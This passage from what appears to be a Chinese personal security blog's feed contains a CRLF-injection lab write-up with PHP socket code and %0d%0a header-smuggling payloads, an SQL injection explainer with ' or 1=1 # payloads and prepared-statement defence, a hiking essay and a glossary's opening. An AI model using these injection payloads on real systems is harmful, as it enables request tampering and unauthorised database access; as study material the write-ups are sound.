<span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>url：<code>http://xxx.top:111/index.php</code></p><p>监听的端口：<code>http://xxx.top:112/index.php</code></p><p>payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://xxx.top:<span class="number">111</span>/index.php?url=xxx.top:<span class="number">112</span>/index.php%<span class="number">0</span>d%<span class="number">0</span>aSet-Cookie:<span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>响应包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx.top:111</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>1=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Close</span><br></pre></td></tr></table></figure><p>但是，上述只是理论，下面谈谈我遇到的问题：</p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>本次利用一个IP的两个端口，使用Xshell7。</p><p>第一个问题：</p><p>payload只需要%0d，不需要后面的%0a。</p><p>第二个问题：</p><p>响应包的Set-Cookie有误，后面回环了，我采用多个+来占用，是否有用我不知道。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@iZ:~# nc -lvp 112</span><br><span class="line">Listening on 0.0.0.0 111</span><br><span class="line">Connection received on xxx.xxx</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Set-Cookie:1=1xxx.xxx</span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure><h4 id="漏洞复现–Windows本地phpstorm"><a href="#漏洞复现–Windows本地phpstorm" class="headerlink" title="漏洞复现–Windows本地phpstorm"></a>漏洞复现–Windows本地phpstorm</h4><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="string">&quot;xxx.top&quot;</span>. <span class="title function_ invoke__">chr</span>(<span class="number">13</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">10</span>). <span class="string">&quot;Set-Cookie:1=1&quot;</span>;</span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>:~# nc -lvp <span class="number">520</span></span><br><span class="line"><span class="attribute">Listening</span> <span class="literal">on</span> <span class="number">0.0.0.0</span> <span class="number">520</span></span><br><span class="line"><span class="attribute">Connection</span> received <span class="literal">on</span> x.x.x.x.broad.fz.fj.dynamic.<span class="number">163</span>data.com.cn <span class="number">1980</span></span><br><span class="line"><span class="attribute">GET</span> / HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: xxx.top</span><br><span class="line"><span class="attribute">Set</span>-Cookie:<span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="attribute">Connection</span>: Close</span><br></pre></td></tr></table></figure><p>只有chr(13)，存在回环。CRLF完整，结果正常。</p><h4 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h4><p>对比云服务器和本机，有以下不同点：</p><ul><li>payload不同。这其实是输入点不同，一个在url框，另一个在代码处。</li><li>Set-Cookie:1&#x3D;1是否规范（回环）。</li></ul><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>概述：</p><p>通过添加两个CRLF，尝试构造POST数据包。</p><p>不过仍需要注意一个请求头：<code>Content-Type</code>，需要把其值设置为：<code>application/x-www-form-urlencoded</code>。</p><p>如果原本存在<code>Content-Type</code>，我们可以尝试把它挤到请求体里（利用对应函数）。其实这里面又涉及到一个思想：</p><p><strong>大胆尝试添加，改造，删除数据，而不是仅仅局限于字面意思，只要能达到目的就是好方法。</strong></p><p>例子如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xx.xx.xx.xx:1110</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>WHOAMI</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=3stu05dr969ogmprk28drnju93</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>11</span><br><span class="line"></span><br><span class="line"><span class="language-routeros"><span class="attribute">data</span>=whoami</span></span><br><span class="line"><span class="language-routeros">Content-Type: text/xml; <span class="attribute">charset</span>=utf-8</span></span><br><span class="line"><span class="language-routeros">SOAPAction: <span class="string">&quot;test#a&quot;</span></span></span><br><span class="line"><span class="language-routeros">Content-Length: 365</span></span><br></pre></td></tr></table></figure><p>下面的<code>Content-Type: text/xml; charset=utf-8</code>就是原本的，被挤下去了。</p><h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h2><p>还有许多历史漏洞没有复现。</p>]]></content>
      
      
      <categories>
          
          <category> CRLF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对于SQL注入原理的学习</title>
      <link href="/2024/06/27/%E5%AF%B9%E4%BA%8ESQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/06/27/%E5%AF%B9%E4%BA%8ESQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><hr><p>写下本文的直接原因是拜读了庆尘大佬的文章（<a href="https://mp.weixin.qq.com/s?__biz=Mzg3Mzg3OTU4OQ==&mid=2247490588&idx=1&sn=b3a407b4198dad7d44a16838a4482dfb&chksm=ced81d56f9af9440dcfef78fa46b2e80a8b36b5559f77369f8a1747b8008809745bffc83219c&mpshare=1&scene=23&srcid=0627f44PAdtKwLySIQom2uGM&sharer_shareinfo=9088a8b0cb537eab6d4069134e7a75ce&sharer_shareinfo_first=9088a8b0cb537eab6d4069134e7a75ce#rd">对SQL注入漏洞原理的思考 (qq.com)</a>，这也是本文的参考文章。推荐大家读读大佬的文章，感受大佬浅显易懂的文笔下的深邃思想。</p><h1 id="0x01-信任输入"><a href="#0x01-信任输入" class="headerlink" title="0x01 信任输入"></a>0x01 信任输入</h1><h2 id="信任问题"><a href="#信任问题" class="headerlink" title="信任问题"></a>信任问题</h2><p><em>安全问题的本质就是信任问题</em></p><p>例如对一个网站的开发来说</p><ul><li>信任普通用户的输入——前台漏洞</li><li>信任管理员用户的输入——后台漏洞</li><li>信任离线升级&#x2F;在线升级&#x2F;自动化升级&#x2F;升级包——供应链攻击</li><li>不信任任何输入——信任代码逻辑——逻辑漏洞</li></ul><p><strong>有时候信任是可以被提升的——越权。</strong></p><h2 id="防御核心"><a href="#防御核心" class="headerlink" title="防御核心"></a>防御核心</h2><p><em>对应的安全方案有很多，但都可以简化为</em></p><blockquote><p><strong>输入</strong>——检测是否存在风险——输出</p></blockquote><p>黑客往往是从输入入手。所以我们重点关心的问题也就是<strong>如何处理信任与输入的关系</strong></p><h1 id="0x02-控制流和数据流"><a href="#0x02-控制流和数据流" class="headerlink" title="0x02 控制流和数据流"></a>0x02 控制流和数据流</h1><blockquote><p>可以将程序员的代码分割为两个部分</p><ul><li>一部分是控制代码走向的<strong>控制流</strong>代码</li><li>另一部分是用来<strong>被</strong>展示，<strong>被</strong>存储，<strong>被</strong>流转的<strong>数据流</strong>(包括输入的数据和程序员设定的数据)</li></ul></blockquote><p><strong>被</strong>，是被动，说明了数据流的数据不应该具有主动性。说实在一点，外来的数据不能影响内部的控制程序。一旦数据流可以入侵到控制流，那么漏洞也随之而生。</p><h1 id="0x03-以SQL注入为例"><a href="#0x03-以SQL注入为例" class="headerlink" title="0x03 以SQL注入为例"></a>0x03 以SQL注入为例</h1><h2 id="薄弱的程序"><a href="#薄弱的程序" class="headerlink" title="薄弱的程序"></a>薄弱的程序</h2><p>先看一段简单的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$db</span> = <span class="title function_ invoke__">init_db</span>();</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from users where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这是一个最简单的SQL注入代码，再看看payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=admin&#x27; <span class="keyword">and</span> <span class="attribute">1</span>=1 #</span><br><span class="line"></span><br><span class="line"><span class="attribute">username</span>=<span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure><p>让我们理理逻辑：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入——php字符变量——<span class="keyword">SQL</span>语句——数据库</span><br></pre></td></tr></table></figure><p>很好，这就搭建起了输入和后端的关系。</p><h2 id="背后的原理"><a href="#背后的原理" class="headerlink" title="背后的原理"></a>背后的原理</h2><p>程序员希望我们输入的是正常的数据，也就是程序员期望得到一个不能影响控制流的输入流。</p><p>但是我们的payload通过绕过闭合，成功使数据流入侵了控制流。</p><p>正如上文所说：</p><p>​一旦数据流可以入侵到控制流，那么漏洞也随之而生。</p><blockquote><ul><li>这里就引出了代码审计的两个核心</li><li>能否让数据流逃逸到控制流</li><li>业务逻辑可能产生的点在哪</li></ul></blockquote><h1 id="0x04-预编译"><a href="#0x04-预编译" class="headerlink" title="0x04 预编译"></a>0x04 预编译</h1><p>以PHP的预编译为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建连接 </span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>); </span><br><span class="line"><span class="comment">// 获取用户输入 </span></span><br><span class="line"><span class="variable">$user_input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user_input&#x27;</span>];    </span><br><span class="line"><span class="comment">// 使用预编译语句和参数绑定来防止 SQL 注入 </span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>);  </span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$user_input</span>);  </span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();  </span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br></pre></td></tr></table></figure><p>预编译为什么能防止SQL注入</p><blockquote><p>预编译语句通过将SQL<strong>查询语句</strong>与<strong>参数</strong>分开，使用占位符来代表参数，然后将用户输入的数据绑定到占位符上，确保了<strong>输入数据被正确地解释为字符串而不是SQL代码</strong>。因此，无论用户输入什么数据，都不会影响原始查询的结构和意图，从而有效地防止了SQL注入攻击。</p></blockquote><p>让我们再理理思路：</p><ul><li>为什么需要使用预编译——因为要防止SQL注入</li><li>为什么要防止SQL注入——防止数据流入侵到控制流</li><li>怎样防止数据流入侵到控制流——将用户的输入限制到输入流</li></ul><p>归根结底，还是要限制用户的输入，也就是回到了<strong>信任</strong>的问题上</p><h1 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05 结语"></a>0x05 结语</h1><p>我写的这篇文章抄袭居多，思路生硬，但是仍然写出来，是因为学习安全需要对问题本质上的思考，哲学上的思考。不写，不得深思。</p><p>另外，我也很希望读到能上升到思想与哲学的文章，再次感谢庆尘大佬。</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再见，郊野山！</title>
      <link href="/2024/06/22/%E5%86%8D%E8%A7%81%EF%BC%8C%E9%83%8A%E9%87%8E%E5%B1%B1%EF%BC%81/"/>
      <url>/2024/06/22/%E5%86%8D%E8%A7%81%EF%BC%8C%E9%83%8A%E9%87%8E%E5%B1%B1%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="再见，郊野山！"><a href="#再见，郊野山！" class="headerlink" title="再见，郊野山！"></a>再见，郊野山！</h1><h2 id="决定"><a href="#决定" class="headerlink" title="决定"></a>决定</h2><p>​我想与你告别，于是决定去看望你。</p><p>​我也怀念你，便在一路上构思着文章。写文章与看望你，慢慢地互成因果。</p><p>​我知道，你已然住进了我的文章。</p><p>​</p><h2 id="去途"><a href="#去途" class="headerlink" title="去途"></a>去途</h2><p>​这是最后一次旅途了吗，我不确定。</p><p>​在绝望坡下，思考看望你的意义。任凭思绪飘乱，我渐渐明白了：因为想你，所以去了。</p><p>​其实人究其一生，都在与内心作答。顺着内心行走，或许就没有多少愧疚的事了。</p><p>​</p><p>​顺着科技园的道路直下，四周被绿意吞噬，只剩几座庞然笔直的建筑默立。</p><p>​建筑并不突兀，而是与绿意交融。有些建筑或许荒废了，藤蔓肆满窗台，似乎要遮盖整个楼层。很难想象有人在这里上班。注视这狂野的绿意，思绪也蔓延到千万年之后，内心浮动着一丝丝悲哀。</p><p>​有些建筑颇有古意。湖上有一座木廊桥，桥内有一座庙，庙里有一坐人。焚香袅袅，游绕周身，想必他是安宁的。</p><p><img src="/./../images/posts/%E5%86%8D%E8%A7%81%EF%BC%8C%E9%83%8A%E9%87%8E%E5%B1%B1%EF%BC%81/IMG_20240622_143001.jpg" alt="古意"></p><p>​可我却难以安宁······</p><p>​</p><h2 id="上山"><a href="#上山" class="headerlink" title="上山"></a>上山</h2><p>​到了入口。又好像回到了第一次相逢。当时亦是盛夏，却要晚一点，凉快一点。</p><p><img src="/./../images/posts/%E5%86%8D%E8%A7%81%EF%BC%8C%E9%83%8A%E9%87%8E%E5%B1%B1%EF%BC%81/IMG_20240622_143203.jpg" alt="入口"></p><p>​那时我还没见到你。之后数次我都是独行，你便一直陪伴着我。</p><p>​第二次之前，怕蛇而不敢来。但我到底克服了恐惧，也因此与你相遇。</p><p>​</p><p>​我还是怕蛇，即使是最后一次。但是一路没蛇，又是你在庇佑吗？</p><p>​山上光影碎乱，少有微风。看到有人行在前方，倒是微微松了口气。</p><p>​山谷向阳，绿意盎然。那是一片我从未到过的地方。不能漫游于斯，我感到略有遗憾。</p><p>​<img src="/./../images/posts/%E5%86%8D%E8%A7%81%EF%BC%8C%E9%83%8A%E9%87%8E%E5%B1%B1%EF%BC%81/IMG_20240622_144402.jpg" alt="山谷美景"></p><p>​遗憾是不可避免的，因为我们希冀着美好。但只要心情简单、随遇而安，遗憾于是也不遗憾了。</p><p>​</p><p>​前方微微曲折向上，行道一泻金光。忽然，树枝微晃······</p><p>​“是有蛇吗？”我一惊！</p><p>​转念一想，应该是你在向我打招呼吧！老友，你总是这么令人惊讶。</p><p>​深呼一口气，再次行进。</p><p>​</p><p>​不只是我，人们都很爱你。</p><p><img src="/./../images/posts/%E5%86%8D%E8%A7%81%EF%BC%8C%E9%83%8A%E9%87%8E%E5%B1%B1%EF%BC%81/IMG_20240622_144245.jpg" alt="郊野山上"></p><p>​人们拍下至美，镌刻在时流中。</p><p>​于我来前，你便不是孤独的。在我走后，你亦会焕发新的光景，直至时光尽头。</p><p>​我何曾不是天地间的过客，于茫渺中与你相逢。正是这样的相逢，令我感动，令我满足。</p><p>​</p><h2 id="下山"><a href="#下山" class="headerlink" title="下山"></a>下山</h2><p>​你看，路走了一半。</p><p>​上山是累的，累的来不及多想。于是所有的悲伤豆埋伏在下山的折角，待我绕过一座厂子、几间屋舍，便猛地撞向我。阴影遮蔽，我一度以为下山的路上不再有日光。</p><p>​可是数个转角之后是满山的日光！日光洋洋洒洒地铺落在青翠的山丘上，蝉鸣于此刻爆发。夏午的风流携带着故乡的山气，很隐约，很怀念。</p><p>​”这是你给我的礼物吗？“我还是在想。</p><p>​只有微风回荡，故乡如在眼前。</p><p>​</p><p>​一路有人。</p><p>​光影同前几次重叠，回忆与思绪交融。</p><p>​我最喜欢见到大人和孩子一起爬山，特别是看到孩子——每一位孩子都是珍贵的精灵！他们慢慢地逛山，连奔腾不止的流光都为之驻目。孩子或懵懂，或机灵，或慢走，或奔跑。在你的怀抱下，一切都变得如此可爱。</p><p>​不知不觉，我走到了学校后门。我曾经想打开这门，想着可以早点结束旅行。</p><p>​可是门没开，我也庆幸门没开。得到，往往意味着失去。</p><p>​门开了，我会失去很重要的东西！</p><p>​</p><p>​向前，有一座高大的岩壁。</p><p><img src="/./../images/posts/%E5%86%8D%E8%A7%81%EF%BC%8C%E9%83%8A%E9%87%8E%E5%B1%B1%EF%BC%81/IMG_20240622_145549.jpg" alt="岩壁"></p><p>​日月风雨，为你披上翠绿的华裳。而奔雷洪流，到底展现你雄峻的岩骨。</p><p>​外圆内周，处之以泰。翩翩君子，如沐春风。</p><p>​我欣喜地收下了你的礼物。</p><p>​</p><p>​最后的一段路，光影都被剪碎，悄悄脱落在行道上，斑驳错落。</p><p>​前方始终有一位老人。肩披蓝毛巾，白衣被汗水浸湿，灰短裤下是稳健的脚步。</p><p>​我忽然想，这会不会是数十年后的我？我坚信，我之暮年，很有兴趣爬山的。</p><p>​老友，这时光的重叠，也是你的礼物吧！</p><p>​</p><p>​下山途中，思绪纷飞。纷飞再久，亦归尘土。我，到终点了······</p><p>​可是你还没有离开！那我便继续前行。</p><p>​</p><h2 id="归途"><a href="#归途" class="headerlink" title="归途"></a>归途</h2><p>​归途皆是烟火！</p><p>​午后行人较少，我去看了医生。</p><p>​医生人好，但是药贵。我的病拖了好一会，我真是一个愚蠢的人。</p><p>​</p><p>​午后的日光猛烈撕咬清洁工的后背，我的心里泛起细冽的悲伤。我想递给他们一瓶水，却拿不出来！</p><p>​我知道为什么不安宁了。我心系着大家，可大家都在苦难中——我也不例外。</p><p>​你，帮我暂时脱离了苦难，又提醒我这深切的苦难。</p><p>​我想我做好准备了。</p><p>​</p><h2 id="告辞"><a href="#告辞" class="headerlink" title="告辞"></a>告辞</h2><p>​一路上，你一直启迪着我，我却没能好好说一声再见。</p><p>​无言之余，我不禁思考，你到底是谁？</p><p>​是沉默的群山，是漫长的旅途，还是那孤独的背影？</p><p>​都不重要了，重要的是：</p><p>​再见，亲爱的郊野山！再见，我亲爱的老友！</p>]]></content>
      
      
      <categories>
          
          <category> 漫漫长路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 感悟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>入门安全必知的基础术语</title>
      <link href="/2024/06/21/%E5%85%A5%E9%97%A8%E5%AE%89%E5%85%A8%E5%BF%85%E7%9F%A5%E7%9A%84%E5%9F%BA%E7%A1%80%E6%9C%AF%E8%AF%AD/"/>
      <url>/2024/06/21/%E5%85%A5%E9%97%A8%E5%AE%89%E5%85%A8%E5%BF%85%E7%9F%A5%E7%9A%84%E5%9F%BA%E7%A1%80%E6%9C%AF%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="入门web安全必知的术语–基础篇"><a href="#入门web安全必知的术语–基础篇" class="headerlink" title="入门web安全必知的术语–基础篇"></a>入门web安全必知的术语–基础篇</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>诸位安好，我是pax。这是初识安全的第二篇文章，主要介绍一些信息安全新人入门必知的基础术语，方便大家跟上大佬的节奏（pax当年就是听不懂这些术语，好痛苦.jpg）。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><em>以下引用均来自Wiki百科和网络</em>。另外，本文介绍略显粗浅，万不能当做学习，仅供了解。</p><h3 id="概念篇"><a href="#概念篇" class="headerlink" title="概念篇"></a>概念篇</h3><h4 id="信息安全与网络安全"><a href="#信息安全与网络安全" class="headerlink" title="信息安全与网络安全"></a>信息安全与网络安全</h4><blockquote><p><strong>信息安全</strong>，意为保护<a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E6%81%AF">信息</a>及<a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F">信息系统</a>免受未经授权的进入、使用、披露、破坏、修改、检视、记录及销毁。政府、军队、公司、金融机构、医院、私人企业积累大量与雇员、顾客、产品、研究、金融数据有关的机密信息，而绝大部分的信息现在被收集、产生、存储在<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E5%AD%90%E8%AE%A1%E7%AE%97%E6%9C%BA">电子计算机</a>内，并通过<a href="https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%AF%E7%B6%B2">网络</a>传送到别的计算机。如果企业的顾客、财政状况、新产品线的机密信息落入竞争对手的掌握，这种安全性的丧失可能会导致经济上的损失、法律诉讼甚至该企业的破产。保护机密的信息是商业上的需求，而在许多情况中也是道德和法律上的需求。</p></blockquote><p>我们专业的方向叫哪个都可以。特别是web安全方向与网络密不可分，不信你可以看看web的中文意思哦。</p><h4 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h4><blockquote><p><strong>夺旗</strong>（英语：Capture the flag，简称“<strong>CTF</strong>”）在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8">计算机安全</a>中是一种活动，当中会将“旗子”秘密地埋藏于有目的的易受攻击的程序或网站。参赛者从其他参赛者（攻／防式夺旗）或主办方（危难式挑战）偷去旗子。[<a href="https://zh.wikipedia.org/wiki/%E5%A5%AA%E6%97%97_(%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8)#cite_note-1">1]</a>[<a href="https://zh.wikipedia.org/wiki/%E5%A5%AA%E6%97%97_(%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8)#cite_note-2">2]</a>夺旗活动派生出数种变体，当中包括于硬件设备内隐藏旗子。相关比赛可透过在线或实体形式进行，亦可分为高级和入门两种层级。[<a href="https://zh.wikipedia.org/wiki/%E5%A5%AA%E6%97%97_(%E7%B6%B2%E8%B7%AF%E5%AE%89%E5%85%A8)#cite_note-start-3">3]</a>此游戏乃基于<a href="https://zh.wikipedia.org/wiki/%E5%A4%BA%E6%97%97">同名传统户外运动</a>而设计。</p></blockquote><p>咱们信息安全专业的比赛。目前国内最高赛事是XCTF。</p><h4 id="hacker（黑客）"><a href="#hacker（黑客）" class="headerlink" title="hacker（黑客）"></a>hacker（黑客）</h4><blockquote><p>黑客（Hacker）当中的中文音译“黑”字总使人对黑客有所误解，真实的黑客主要是指技术高超的<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E5%91%98">程序员</a>，而“<a href="https://zh.wikipedia.org/wiki/%E9%BB%91%E5%B8%BD%E9%BB%91%E5%AE%A2">溃客</a>”（Cracker）才是专指对计算机系统及网络进行恶意破坏的人。除了精通编程、操作系统的人可以被视作黑客，对<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A1%AC%E4%BB%B6">硬件</a>设备做创新的工程师通常也被认为是黑客，另外现在精通网络入侵的人也被看作是黑客。然而在媒体的推波助澜下，“黑客”这一词早已被污名化，由于影视作品、媒体报导通常描述他们进行违法行为，使主流社会一般把黑客看作为“<a href="https://zh.wikipedia.org/wiki/%E7%94%B5%E8%84%91%E7%8A%AF%E7%BD%AA">计算机犯罪分子</a>”（Cybercriminal）。</p></blockquote><h3 id="网络篇"><a href="#网络篇" class="headerlink" title="网络篇"></a>网络篇</h3><h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><blockquote><p><strong>超文本传输协议</strong>（英语：<strong>H</strong>yper<strong>T</strong>ext <strong>T</strong>ransfer <strong>P</strong>rotocol，缩写：<strong>HTTP</strong>）是一种用于分布式、协作式和<a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E5%AA%92%E9%AB%94">超媒体</a>信息系统的<a href="https://zh.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E5%B1%82">应用层</a><a href="https://zh.wikipedia.org/wiki/%E7%BD%91%E7%BB%9C%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">协议</a>[<a 